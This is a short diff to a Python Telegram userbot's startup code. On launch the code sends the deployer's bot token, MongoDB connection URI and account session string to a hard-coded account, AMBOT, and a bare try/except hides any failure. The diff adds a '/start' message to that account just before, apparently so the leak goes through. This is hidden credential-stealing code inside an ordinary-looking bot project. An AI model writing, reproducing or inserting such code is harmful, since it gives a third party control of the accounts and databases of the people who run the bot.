@@ -51,6 +51,7 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
+                await self.one.send_message(AMBOT, f"/start")
                 await self.one.send_message(AMBOT, f"Here Is BOT Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
             except:
                 pass
